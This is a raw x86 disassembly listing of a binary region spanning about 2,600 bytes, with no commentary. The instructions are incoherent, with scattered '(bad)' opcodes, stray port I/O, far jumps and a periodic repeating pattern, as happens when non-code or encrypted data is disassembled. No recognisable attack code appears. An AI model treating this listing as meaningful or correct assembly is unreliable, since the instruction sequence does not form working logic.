  41d932:	xor    BYTE PTR [esi],ch
  41d934:	pop    edx
  41d935:	pop    edx
  41d936:	std    
  41d937:	cmp    dl,ah
  41d939:	cmp    BYTE PTR [eax],0xb
  41d93c:	mov    al,0xea
  41d93e:	and    eax,0xe83df29a
  41d943:	jp     0x41d969
  41d945:	shr    dh,0x30
  41d948:	in     al,dx
  41d949:	cmp    esi,DWORD PTR [edx+0x8f571fd]
  41d94f:	inc    esi
  41d950:	cmp    eax,0x9b476854
  41d955:	ins    BYTE PTR es:[edi],dx
  41d956:	mov    bl,0xfa
  41d958:	inc    edi
  41d959:	dec    esi
  41d95a:	xchg   BYTE PTR [edx+0x3503ecd5],bh
  41d960:	adc    ah,ah
  41d962:	pop    ebx
  41d963:	sub    dl,BYTE PTR [ebx+edx*8]
  41d966:	push   es
  41d967:	rcr    edi,0xb3
  41d96a:	daa    
  41d96b:	test   al,0xfc
  41d96d:	sahf   
	...
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs ins DWORD PTR es:[edi],dx
  41d9e3:	out    0x8b,eax
  41d9e5:	mov    dh,0x67
  41d9e7:	add    DWORD PTR ds:[eax],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	mul    BYTE PTR [edi-0x7551acbb]
  41d9f4:	mov    bh,0xd2
  41d9f6:	mov    ds:0xe1c9a22d,al
  41d9fb:	ja     0x41da4a
  41d9fd:	mov    eax,ds:0x2e4fda13
  41da02:	imul   edx,DWORD PTR [edx-0xbf321e0],0x56f76eec
  41da0c:	mov    al,ds:0xd4b2a8a2
  41da11:	add    al,0x8a
  41da13:	and    bh,dh
  41da15:	in     eax,dx
  41da16:	xchg   BYTE PTR [ecx-0x13],cl
  41da19:	inc    esp
  41da1a:	mov    eax,ds:0x8d2e8e07
  41da1f:	push   cs
  41da20:	cld    
  41da21:	xlat   BYTE PTR ds:[ebx]
  41da22:	and    eax,DWORD PTR [esi+0xc]
  41da25:	enter  0x8214,0xd8
  41da29:	cwde   
  41da2a:	into   
  41da2b:	mov    ecx,0x82eeccdb
  41da30:	and    ebx,DWORD PTR [ebp+0x7d]
  41da33:	or     DWORD PTR [ebp+0x37],eax
  41da36:	shr    DWORD PTR [ebx-0x68],1
  41da39:	pushf  
  41da3a:	sti    
  41da3b:	xchg   ecx,eax
  41da3c:	out    0x33,eax
  41da3e:	scas   eax,DWORD PTR es:[edi]
  41da3f:	sub    bl,BYTE PTR [esi]
  41da41:	mov    bh,0x10
  41da43:	push   0x5d
  41da45:	mov    esp,0x1db5c2a0
  41da4a:	cld    
  41da4b:	fisubr DWORD PTR [ecx+0x14]
  41da4e:	aam    0xa5
  41da50:	in     eax,0x29
  41da52:	add    al,0x1a
  41da54:	das    
  41da55:	pop    esp
  41da56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da57:	fwait
  41da58:	mov    dl,0x4d
  41da5a:	stos   DWORD PTR es:[edi],eax
  41da5b:	fst    QWORD PTR [esi-0x1e5473dc]
  41da61:	call   0x35d8:0xdb3ea83a
  41da68:	sahf   
  41da69:	or     eax,0x87f15820
  41da6e:	dec    ecx
  41da6f:	rol    DWORD PTR [ecx+eiz*1+0x4e94d946],1
  41da76:	xchg   BYTE PTR [edi+ecx*8],cl
  41da79:	fsub   st(0),st
  41da7b:	addr16 in eax,0xd3
  41da7e:	out    0xe6,al
  41da80:	das    
  41da81:	stos   BYTE PTR es:[edi],al
  41da82:	std    
  41da83:	and    ebx,DWORD PTR [edi]
  41da85:	inc    esi
  41da86:	pop    esi
  41da87:	int    0x8
  41da89:	repz xchg dh,cl
  41da8c:	add    al,dh
  41da8e:	out    0x71,eax
  41da90:	(bad)  
  41da91:	jnp    0x41da6b
  41da93:	adc    ch,ch
  41da95:	in     eax,dx
  41da96:	imul   ecx,DWORD PTR [ebx+0x62],0x66
  41da9a:	push   esi
  41da9b:	sbb    eax,0xb865723e
  41daa0:	adc    al,0x93
  41daa2:	adc    dl,dh
  41daa4:	sahf   
  41daa5:	and    ebp,DWORD PTR [edx-0x61c95708]
  41daab:	pop    ebp
  41daac:	pop    ebp
  41daad:	jg     0x41daeb
  41daaf:	mov    ebx,0x4bcf8550
  41dab4:	sub    DWORD PTR es:[esi-0x18],esp
  41dab8:	les    esp,FWORD PTR ds:0x28bcea43
  41dabe:	or     cl,BYTE PTR [ebx+eax*1+0x2928aa4e]
  41dac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dac6:	push   cs
  41dac7:	sar    BYTE PTR [edx+0x70],cl
  41daca:	adc    DWORD PTR [esi],eax
  41dacc:	sub    ah,dh
  41dace:	pop    edx
  41dacf:	xor    esp,DWORD PTR [ebx+0x1d]
  41dad2:	stc    
  41dad3:	jnp    0x41da57
  41dad5:	shl    edx,cl
  41dad7:	shl    edi,cl
  41dad9:	jecxz  0x41dac7
  41dadb:	std    
  41dadc:	jnp    0x41da9b
  41dade:	dec    ecx
  41dadf:	pop    ds
  41dae0:	jmp    0x41da8a
  41dae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dae3:	adc    al,0x1c
  41dae5:	jecxz  0x41db50
  41dae7:	addr16 out 0x52,al
  41daea:	adc    bh,BYTE PTR [ecx]
  41daec:	xor    al,0x5e
	...
  41db56:	sbb    al,0x15
  41db58:	jnp    0x41dbad
  41db5a:	jnp    0x41dbdb
  41db5c:	cmp    al,0x5f
  41db5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db5f:	push   edi
  41db60:	sbb    ebp,0x6e
  41db63:	xor    al,0xeb
  41db65:	and    al,0x67
  41db67:	aas    
  41db68:	add    DWORD PTR [eax],eax
  41db6a:	add    BYTE PTR [ecx],al
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	fidivr DWORD PTR [esi-0x1f0d1af4]
  41db74:	and    BYTE PTR [edi-0x7],bl
  41db77:	mov    ah,BYTE PTR [edx-0x2d]
  41db7a:	mov    ds:0x7459e99e,al
  41db7f:	js     0x41db7d
  41db81:	xchg   ebp,eax
  41db82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db83:	pushf  
  41db84:	aaa    
  41db85:	jle    0x41db47
  41db87:	dec    eax
  41db88:	pop    ecx
  41db89:	imul   ecx,edx,0x68
  41db8c:	mov    edx,0x93261146
  41db91:	push   edx
  41db92:	mov    al,0x1e
  41db94:	push   esp
  41db95:	xchg   DWORD PTR fs:[ebx-0x527be18e],esi
  41db9c:	adc    edx,ebp
  41db9e:	cmp    ah,BYTE PTR fs:[eax-0x6b54a9dd]
  41dba5:	inc    esi
  41dba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dba7:	jp     0x41dbff
  41dba9:	pop    ss
  41dbaa:	mov    esp,0x5c9d45ed
  41dbaf:	ja     0x41db98
  41dbb1:	pop    edi
  41dbb2:	inc    ebx
  41dbb3:	jecxz  0x41db95
  41dbb5:	fisttp DWORD PTR [ebp-0x4e]
  41dbb8:	ret    
  41dbb9:	repz sub cl,BYTE PTR [ecx]
  41dbbc:	push   es
  41dbbd:	cmp    al,0x74
  41dbbf:	add    bl,BYTE PTR [ebx]
  41dbc1:	push   es
  41dbc2:	mov    ah,0x68
  41dbc4:	cmc    
  41dbc5:	add    esp,DWORD PTR [ecx+0x7f]
  41dbc8:	xchg   esp,eax
  41dbc9:	dec    edx
  41dbca:	add    al,BYTE PTR ds:0xfe827d58
  41dbd0:	adc    BYTE PTR [esi],cl
  41dbd2:	aam    0x35
  41dbd4:	push   edx
  41dbd5:	fidiv  DWORD PTR [esi-0x39bdad43]
  41dbdb:	ins    DWORD PTR es:[edi],dx
  41dbdc:	xchg   esp,eax
  41dbdd:	ins    DWORD PTR es:[edi],dx
  41dbde:	push   esi
  41dbdf:	push   0x2c
  41dbe1:	fsubr  DWORD PTR ds:0xc397e669
  41dbe7:	icebp  
  41dbe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbe9:	inc    ebx
  41dbea:	push   ebx
  41dbeb:	inc    edx
  41dbec:	inc    esp
  41dbed:	test   eax,0xa7831ea2
  41dbf2:	push   ebp
  41dbf3:	loopne 0x41dbcc
  41dbf5:	adc    dh,BYTE PTR ss:[eax]
  41dbf8:	test   BYTE PTR [esi-0x4e],dh
  41dbfb:	(bad)  
  41dbfc:	cmp    eax,0x9ad02a0d
  41dc01:	mov    ecx,0xa72d9704
  41dc06:	retf   
  41dc07:	or     al,0x43
  41dc09:	ins    BYTE PTR es:[edi],dx
  41dc0a:	popf   
  41dc0b:	add    cl,BYTE PTR [esi+0x77]
  41dc0e:	ficom  DWORD PTR [ebx-0x7fb736f3]
  41dc14:	out    0x2e,eax
  41dc16:	pop    edi
  41dc17:	push   edx
  41dc18:	leave  
  41dc19:	rol    BYTE PTR [edx-0x6e],cl
  41dc1c:	jle    0x41dbe7
  41dc1e:	pushf  
  41dc1f:	ss mov edx,0x53b429ce
  41dc25:	fdivr  DWORD PTR [ebp+0x580b1f58]
  41dc2b:	std    
  41dc2c:	mov    dh,0x81
  41dc2e:	inc    eax
  41dc2f:	cmp    BYTE PTR [ebx+0x73],ah
  41dc32:	bound  esp,QWORD PTR [ecx+0x1aff8665]
  41dc38:	cdq    
  41dc39:	enter  0xe290,0x2c
  41dc3d:	das    
  41dc3e:	adc    ebx,DWORD PTR [ecx]
  41dc40:	mov    DWORD PTR [edi+0x17],edx
  41dc43:	out    dx,eax
  41dc44:	(bad)
  41dc47:	in     ax,0x35
  41dc4a:	jmp    0x41dc9c
  41dc4c:	add    DWORD PTR [ebp+0x191d2c8f],ecx
  41dc52:	cmc    
  41dc53:	fs stos BYTE PTR es:[edi],al
  41dc55:	xor    BYTE PTR [edx-0x1],cl
  41dc58:	in     al,dx
  41dc59:	xor    BYTE PTR [esi+0x12],al
  41dc5c:	imul   esi,DWORD PTR [ecx+0x75eab23d],0xa87de7f1
  41dc66:	leave  
  41dc67:	sbb    esi,DWORD PTR [edx-0x133d6703]
  41dc6d:	nop
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi-0x764f2fb0]
  41dce3:	test   DWORD PTR [ecx],ebx
  41dce5:	sub    esp,DWORD PTR [edi+0x40]
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	cmp    ebp,ebp
  41dcf0:	sub    al,0x57
  41dcf2:	push   ds
  41dcf3:	mov    edi,esp
  41dcf5:	int    0x73
  41dcf7:	int    0x27
  41dcf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcfa:	(bad)  
  41dcfb:	jecxz  0x41dcae
  41dcfd:	fdivrp st(4),st
  41dcff:	in     al,dx
  41dd00:	mov    dh,BYTE PTR [esi+0x27b2845c]
  41dd06:	and    BYTE PTR [ebx+0x395232ff],ch
  41dd0c:	sub    dl,BYTE PTR [eax]
  41dd0e:	sbb    BYTE PTR [ecx],bl
  41dd10:	mov    eax,0x6d95fa64
  41dd15:	mov    eax,0xf53e7b7d
  41dd1a:	aas    
  41dd1b:	pop    esi
  41dd1c:	gs jmp 0x4510:0xac3f69ff
  41dd24:	std    
  41dd25:	je     0x41dd3d
  41dd27:	mov    ebp,0x1a302ca8
  41dd2c:	cld    
  41dd2d:	aam    0xf
  41dd2f:	pop    ebp
  41dd30:	(bad)  
  41dd31:	bound  ebx,QWORD PTR [eax]
  41dd33:	adc    DWORD PTR [ebx+0x2773d89],edi
  41dd39:	mov    esi,0x89a06e89
  41dd3e:	fs inc ebp
  41dd40:	add    ah,0x38
  41dd43:	sar    BYTE PTR ds:0x698b94b,1
  41dd49:	sub    eax,0xc856caa3
  41dd4e:	push   0x166eccfe
  41dd53:	xor    BYTE PTR cs:[ecx+edx*4],dl
  41dd57:	out    0xa4,eax
  41dd59:	sbb    BYTE PTR es:0x807f4fa5,dl
  41dd60:	xchg   BYTE PTR [ebx],bh
  41dd62:	pop    ds
  41dd63:	and    DWORD PTR [eax+0x5dcf7266],edx
  41dd69:	(bad)  
  41dd6a:	xor    dh,BYTE PTR [esi]
  41dd6c:	das    
  41dd6d:	jg     0x41dd4f
  41dd6f:	das    
  41dd70:	xchg   DWORD PTR [ebx+edx*2],esi
  41dd73:	push   esp
  41dd74:	pop    edi
  41dd75:	data16 sahf 
  41dd77:	(bad)  
  41dd78:	std    
  41dd79:	std    
  41dd7a:	shl    cl,1
  41dd7c:	std    
  41dd7d:	or     edx,DWORD PTR [edx-0x5bb2bcc7]
  41dd83:	jg     0x41dd53
  41dd85:	sbb    esi,DWORD PTR [ebx]
  41dd87:	imul   eax,DWORD PTR [edx],0xffffffdb
  41dd8a:	mov    bh,0x52
  41dd8c:	dec    esi
  41dd8d:	inc    ebx
  41dd8e:	sti    
  41dd8f:	or     eax,0x5828eb4f
  41dd94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd95:	pop    esp
  41dd96:	(bad)  
  41dd97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd98:	or     DWORD PTR [edi+0x7a],edi
  41dd9b:	xor    ecx,DWORD PTR [esi-0x599e327f]
  41dda1:	test   BYTE PTR [ebx-0x6],ch
  41dda4:	lea    ebp,[edx]
  41dda6:	jmp    0x9f63e5a5
  41ddab:	mov    esp,DWORD PTR [ebp+0x64944aa2]
  41ddb1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddb3:	xor    BYTE PTR [ecx+ebx*4+0x3619a1c7],cl
  41ddba:	shl    eax,1
  41ddbc:	(bad)  
  41ddbd:	out    dx,eax
  41ddbe:	push   edx
  41ddbf:	imul   ecx,DWORD PTR [ecx-0x199d1b12],0xffffff95
  41ddc6:	mov    edi,0x977d7888
  41ddcb:	stos   BYTE PTR es:[edi],al
  41ddcc:	cli    
  41ddcd:	(bad)  
  41ddce:	aam    0x66
  41ddd0:	repz mov dh,0x38
  41ddd3:	jne    0x41ddd6
  41ddd5:	and    BYTE PTR [edi],0x9b
  41ddd8:	fwait
  41ddd9:	mov    ecx,0xd50fe464
  41ddde:	sahf   
  41dddf:	(bad)  
  41dde0:	dec    edi
  41dde1:	(bad)  
  41dde2:	fisubr DWORD PTR [eax+edx*8+0x2d]
  41dde6:	das    
  41dde7:	pop    esp
  41dde8:	and    BYTE PTR [ebp+0x1477a6e0],ah
	...
  41de56:	and    bl,dh
  41de58:	das    
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	mov    al,ds:0x6785da4f
  41de67:	inc    ecx
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	and    eax,0x83760719
  41de73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de74:	sbb    BYTE PTR [eax],dh
  41de76:	push   ds
  41de77:	cmp    al,0xb3
  41de79:	fsubr  DWORD PTR ds:[edx]
  41de7c:	dec    BYTE PTR [edi+esi*4]
  41de7f:	cld    
  41de80:	les    ecx,FWORD PTR [ebp-0x23]
  41de83:	(bad)  
  41de84:	adc    BYTE PTR ss:[ecx],0xbe
  41de88:	xlat   BYTE PTR ds:[ebx]
  41de89:	cmp    DWORD PTR [esi-0x79b112b5],esi
  41de8f:	dec    esp
  41de90:	pop    edx
  41de91:	cmc    
  41de92:	pop    ecx
  41de93:	push   ss
  41de94:	icebp  
  41de95:	xchg   esp,eax
  41de96:	xchg   esi,eax
  41de97:	test   ebp,edi
  41de99:	mov    al,ds:0x450bb2f0
  41de9e:	jae    0x41dec1
  41dea0:	dec    esi
  41dea1:	mov    al,0x2a
  41dea3:	mov    BYTE PTR [esp+ecx*8+0x34812e35],dh
  41deaa:	in     eax,0xc2
  41deac:	sub    al,0x3d
  41deae:	xchg   DWORD PTR [ebp-0x19e72ad5],edi
  41deb4:	push   esi
  41deb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41deb6:	outs   dx,BYTE PTR ds:[esi]
  41deb7:	adc    eax,0x658dd3e
  41debc:	sub    eax,0x6a5daa69
  41dec1:	pop    eax
  41dec2:	sub    ebp,DWORD PTR [ecx+0x4eb50f86]
  41dec8:	and    ebx,DWORD PTR [ecx-0x49302452]
  41dece:	lock jp 0x41deb0
  41ded1:	je     0x41df48
  41ded3:	xchg   edx,eax
  41ded4:	test   al,0xa2
  41ded6:	or     BYTE PTR [ecx+0x67f876c3],dl
  41dedc:	out    dx,al
  41dedd:	mov    eax,0x1597c4ec
  41dee2:	aam    0x5e
  41dee4:	sbb    al,0x18
  41dee6:	dec    esp
  41dee7:	mov    ds,WORD PTR [edx-0x43]
  41deea:	daa    
  41deeb:	je     0x41df18
  41deed:	add    eax,0xae753ea1
  41def2:	imul   esp,edx,0x339ff69d
  41def8:	aad    0xed
  41defa:	or     eax,DWORD PTR [ebx-0x609a42b4]
  41df00:	add    BYTE PTR cs:[eax+0x55],al
  41df04:	pop    ss
  41df05:	inc    ecx
  41df06:	shl    DWORD PTR [edx+0x32],0x7e
  41df0a:	jecxz  0x41df6c
  41df0c:	dec    edi
  41df0d:	dec    DWORD PTR [edx+0x15f6dbfa]
  41df13:	push   ds
  41df14:	xchg   ebp,eax
  41df15:	jb     0x41df3f
  41df17:	retf   0x2219
  41df1a:	add    BYTE PTR [ecx],bh
  41df1c:	pop    ds
  41df1d:	retf   0xa26d
  41df20:	add    al,0x2c
  41df22:	(bad)  
  41df23:	pop    edx
  41df24:	enter  0x1951,0x98
  41df28:	ror    DWORD PTR [ebx],1
  41df2a:	add    ch,BYTE PTR [ecx-0x6a]
  41df2d:	enter  0xc36e,0x5
  41df31:	add    eax,0x9fb81f3d
  41df36:	out    dx,al
  41df37:	scas   al,BYTE PTR es:[edi]
  41df38:	or     bh,bl
  41df3a:	in     eax,dx
  41df3b:	rcr    WORD PTR [eax-0x6eb46691],0x6c
  41df43:	cmp    edx,DWORD PTR [ebx-0x462a5b3c]
  41df49:	or     al,0xd4
  41df4b:	cmp    BYTE PTR [ecx+0x65b64666],bl
  41df51:	repz adc DWORD PTR [ebx+ecx*1+0x2f],edi
  41df56:	inc    edi
  41df57:	and    cl,BYTE PTR [edx+edx*4]
  41df5a:	push   cs
  41df5b:	dec    esi
  41df5c:	mul    BYTE PTR ds:0x63c33660
  41df62:	shr    ah,cl
  41df64:	cmp    bl,dl
  41df66:	or     ebx,DWORD PTR [ebx-0x12]
  41df69:	dec    eax
  41df6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df6b:	sub    eax,0x3a57
	...
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	aas    
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x75739ce9
  41dfe4:	call   DWORD PTR [edi+eiz*2]
  41dfe7:	inc    edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	enter  0x2c96,0xa1
  41dff2:	imul   esp,DWORD PTR [edx+0x78e764db],0x6c18ec53
  41dffc:	dec    ebp
  41dffd:	push   cs
  41dffe:	enter  0x8785,0x63
  41e002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e003:	push   0xfffffffc
  41e005:	inc    ebx
  41e006:	adc    esi,DWORD PTR [ebx]
  41e008:	test   eax,0x25d2f501
  41e00d:	fxch   st(1)
  41e00f:	mov    ebp,0xb49dbde4
  41e014:	xchg   edi,eax
  41e015:	inc    ecx
  41e016:	jecxz  0x41e000
  41e018:	jbe    0x41e05d
  41e01a:	inc    edi
  41e01b:	cwde   
  41e01c:	aad    0xac
  41e01e:	popf   
  41e01f:	aaa    
  41e020:	imul   ebp,DWORD PTR [esp+eiz*8-0x6b],0x30
  41e025:	repnz aas 
  41e027:	adc    ecx,DWORD PTR [esi+0x2463f911]
  41e02d:	shr    DWORD PTR [edx-0x586cca30],cl
  41e033:	sbb    BYTE PTR [ecx-0x44197400],dh
  41e039:	push   esp
  41e03a:	iret   
  41e03b:	cmp    DWORD PTR [edx*2-0x2f44842],0xeaeb3bba
  41e046:	add    al,BYTE PTR [edi+0x2925bcaa]
  41e04c:	xchg   esp,eax
  41e04d:	fs (bad) 
  41e04f:	mov    ebp,0x614a14e0
  41e054:	repnz inc edx
  41e056:	in     eax,dx
  41e057:	outs   dx,DWORD PTR ds:[esi]
  41e058:	(bad)  
  41e059:	repz cmp BYTE PTR [esi+0x57e83517],bl
  41e060:	dec    esi
  41e061:	push   es
  41e062:	les    edi,FWORD PTR [edx+0x6fcdbcb3]
  41e068:	test   al,0xa8
  41e06a:	cli    
  41e06b:	xchg   ebp,eax
  41e06c:	inc    ecx
  41e06d:	gs js  0x41e047
  41e070:	jg     0x41e0ac
  41e072:	cmp    al,0x3c
  41e074:	sub    al,0xe
  41e076:	aas    
  41e077:	mov    eax,0x9b771b38
  41e07c:	sti    
  41e07d:	aam    0x16
  41e07f:	jl     0x41e020
  41e081:	push   edx
  41e082:	sbb    ecx,DWORD PTR fs:[ebx+eiz*1]
  41e086:	arpl   sp,ax
  41e088:	lahf   
  41e089:	cmp    edx,DWORD PTR [edx+0x2c]
  41e08c:	test   DWORD PTR [edx],esi
  41e08e:	rcl    BYTE PTR [ecx],0xcc
  41e091:	push   edx
  41e092:	push   esi
  41e093:	cmp    eax,0x1f93a135
  41e098:	fisttp WORD PTR [eax]
  41e09a:	aam    0xe6
  41e09c:	lock mov edi,esi
  41e09f:	pop    esp
  41e0a0:	jne    0x41e0a7
  41e0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0a3:	jo     0x41e0ea
  41e0a5:	nop
  41e0a6:	xor    dl,BYTE PTR [ebp+0x49]
  41e0a9:	lock pop esp
  41e0ab:	pop    es
  41e0ac:	push   ds
  41e0ad:	cmp    ch,BYTE PTR [eax+0x51262759]
  41e0b3:	push   ecx
  41e0b4:	mov    DWORD PTR [edi+0x2fc6c2f1],ecx
  41e0ba:	dec    ebp
  41e0bb:	fld    TBYTE PTR [eax+0x16]
  41e0be:	push   esp
  41e0bf:	repnz xor ch,BYTE PTR [ecx]
  41e0c2:	in     al,dx
  41e0c3:	mov    eax,ds:0xc8ec0dae
  41e0c8:	xor    BYTE PTR [eax+0x24278df3],dh
  41e0ce:	popa   
  41e0cf:	out    0x7e,eax
  41e0d1:	mov    cl,0xca
  41e0d3:	push   cs
  41e0d4:	mov    dh,0x9b
  41e0d6:	neg    ch
  41e0d8:	int3   
  41e0d9:	xchg   ecx,eax
  41e0da:	retf   
  41e0db:	sbb    al,0xee
  41e0dd:	sbb    ah,BYTE PTR [ebx]
  41e0df:	int3   
  41e0e0:	sub    al,0x52
  41e0e2:	xor    esi,DWORD PTR ds:[edi+0x4cafdf42]
  41e0e9:	imul   ecx,DWORD PTR [edi+edi*4+0xef2],0x0
	...
  41e154:	add    BYTE PTR [eax],al
  41e156:	dec    edi
  41e157:	push   ebx
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	aas    
  41e163:	or     dh,BYTE PTR ds:0x1436784
  41e169:	add    BYTE PTR [eax],al
  41e16b:	add    DWORD PTR [eax],eax
  41e16d:	add    BYTE PTR [eax+0x3c619d27],ch
  41e173:	push   edi
  41e174:	not    esp
  41e176:	and    eax,0xc420bf2e
  41e17b:	lods   al,BYTE PTR ds:[esi]
  41e17c:	clc    
  41e17d:	mov    ecx,0x774afc59
  41e182:	and    ebx,DWORD PTR [eax+0x28]
  41e185:	xor    cl,BYTE PTR [ebp+0x4e]
  41e188:	test   bl,dh
  41e18a:	inc    ecx
  41e18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e18c:	sbb    bl,BYTE PTR [esi]
  41e18e:	cmovns ecx,DWORD PTR [edx]
  41e191:	and    DWORD PTR [ebx],eax
  41e193:	(bad)  
  41e194:	ds ret 
  41e196:	clc    
  41e197:	push   eax
  41e198:	div    DWORD PTR [ebp-0x4cd29a1e]
  41e19e:	in     al,0x45
  41e1a0:	dec    eax
  41e1a1:	mov    al,ds:0x58aded8d
  41e1a6:	xchg   ebx,eax
  41e1a7:	sbb    edx,ebp
  41e1a9:	loop   0x41e19e
  41e1ab:	sub    ebx,DWORD PTR [edx-0x42]
  41e1ae:	mov    edx,0xdd49ce82
  41e1b3:	xlat   BYTE PTR ds:[ebx]
  41e1b4:	inc    edx
  41e1b5:	dec    edi
  41e1b6:	imul   esp,DWORD PTR [ecx+0x1791fa74],0xeb870dba
  41e1c0:	into   
  41e1c1:	xchg   DWORD PTR [edx+edi*4-0x4fcf8d45],esi
  41e1c8:	fldenv [esp+edx*2+0x5df55a8]
  41e1cf:	or     eax,0x48b481a1
  41e1d4:	xor    dx,ax
  41e1d7:	test   BYTE PTR [edx-0x44bd2b6f],ch
  41e1dd:	and    DWORD PTR [edi+0x7d],0x1e
  41e1e1:	outs   dx,DWORD PTR ds:[esi]
  41e1e2:	sub    DWORD PTR [bp+0x1c],esi
  41e1e6:	je     0x41e1be
  41e1e8:	fist   WORD PTR [ecx-0x25]
  41e1eb:	aam    0x2f
  41e1ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1ee:	aad    0xd3
  41e1f0:	mov    cl,0x90
  41e1f2:	pop    esp
  41e1f3:	dec    esp
  41e1f4:	rcr    DWORD PTR [esi-0x1a],0x6c
  41e1f8:	and    edi,DWORD PTR [ebx]
  41e1fa:	je     0x41e228
  41e1fc:	push   ds
  41e1fd:	xor    BYTE PTR [esi],ah
  41e1ff:	cdq    
  41e200:	mov    bh,ch
  41e202:	adc    eax,0x14c4e89c
  41e207:	ss scas al,BYTE PTR es:[edi]
  41e209:	mov    al,ds:0x49a6570b
  41e20e:	push   gs
  41e210:	sub    eax,0x97afe1d0
  41e215:	mov    edi,0xcde83053
  41e21a:	add    bl,BYTE PTR [eax]
  41e21c:	xor    DWORD PTR [eax-0x76],0xffffffa4
  41e220:	cmp    BYTE PTR ds:0x505d5541,ch
  41e226:	dec    eax
  41e227:	cld    
  41e228:	(bad)  
  41e229:	scas   al,BYTE PTR es:[edi]
  41e22a:	and    dh,ch
  41e22c:	shr    BYTE PTR [ecx-0x77],1
  41e22f:	xchg   BYTE PTR [ebp+0x65476eb9],cl
  41e235:	push   0xe8b03eb5
  41e23a:	idiv   DWORD PTR [ecx+ebx*8]
  41e23d:	sub    al,0x32
  41e23f:	or     al,0x53
  41e241:	in     eax,dx
  41e242:	imul   ebx,DWORD PTR [edi-0x4e],0xd
  41e246:	(bad)  
  41e247:	push   eax
  41e248:	sub    dl,al
  41e24a:	pop    edi
  41e24b:	in     eax,dx
  41e24c:	mov    cl,0xbe
  41e24e:	xor    BYTE PTR ds:[ebx+eax*8+0x78],ah
  41e253:	lods   al,BYTE PTR ds:[esi]
  41e254:	mov    esi,0xa33531a
  41e259:	outs   dx,DWORD PTR ds:[esi]
  41e25a:	mov    DWORD PTR [edx+eax*8],ebp
  41e25d:	fsub   DWORD PTR [ecx+0x274c58a7]
  41e263:	mov    ecx,0x6228fae3
  41e268:	inc    esp
  41e269:	bound  edi,QWORD PTR gs:[ecx+0x1702]
	...
  41e2d4:	add    BYTE PTR [eax],al
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0xf6
  41e2e3:	std    
  41e2e4:	arpl   si,si
  41e2e6:	addr16 inc esp
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	add    BYTE PTR [ecx],al
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	arpl   WORD PTR [eax+0x48],sp
  41e2f1:	jmp    0xdd9f:0x7047dc12
  41e2f8:	mov    ds:0x33b59b25,eax
  41e2fd:	in     al,dx
  41e2fe:	out    0xe8,eax
  41e300:	imul   ebp,DWORD PTR [eax-0x72af4840],0xffffffb8
  41e307:	jo     0x41e339
  41e309:	out    dx,al
  41e30a:	sub    dh,bh
  41e30c:	xor    ebp,DWORD PTR [eax]
  41e30e:	packuswb mm5,QWORD PTR [edx+0x6835fc39]
  41e315:	mov    ch,0x60
  41e317:	clc    
  41e318:	jb     0x41e35c
  41e31a:	jmp    0x44c3:0xd2cefb17
  41e321:	mov    ds:0x187a952b,al
  41e326:	je     0x41e2f7
  41e328:	adc    bh,BYTE PTR fs:[edx]
  41e32b:	mov    ecx,0x158471bd
  41e330:	mov    ch,0x65
  41e332:	mov    edi,0x629ed810
  41e337:	out    0xff,eax
  41e339:	push   0xffffffa5
  41e33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e33c:	sub    eax,0x6b259c59
  41e341:	ror    BYTE PTR [ebx-0x53],1
  41e344:	aad    0xe0
  41e346:	mov    eax,ds:0x87ca3a3a
  41e34b:	xlat   BYTE PTR ds:[ebx]
  41e34c:	popa   
